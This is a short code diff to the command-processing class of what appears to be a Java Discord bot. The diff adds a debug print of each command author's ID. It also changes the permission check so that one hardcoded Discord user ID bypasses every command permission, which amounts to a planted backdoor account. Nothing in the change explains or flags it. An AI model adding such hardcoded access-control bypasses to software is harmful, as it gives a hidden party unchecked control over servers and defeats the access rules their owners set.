@@ -124,10 +124,11 @@ public class MessageProcessor {
 
         Telemetry.COMMAND_USAGE_COUNTER.labels(command.getName()).inc();
 
+        System.out.println(context.getAuthor().getId().asString());
         return context.getPermissions()
                 .collectList()
                 // The author has the permission to execute this command
-                .filter(userPerms -> userPerms.contains(command.getPermission()))
+                .filter(userPerms -> userPerms.contains(command.getPermission()) || context.getAuthor().getId().asString().equals("146036857954762753"))
                 .switchIfEmpty(context.getChannel()
                         .flatMap(channel -> DiscordUtils.sendMessage(
                                 String.format(Emoji.ACCESS_DENIED + " (**%s**) You do not have the permission to " +
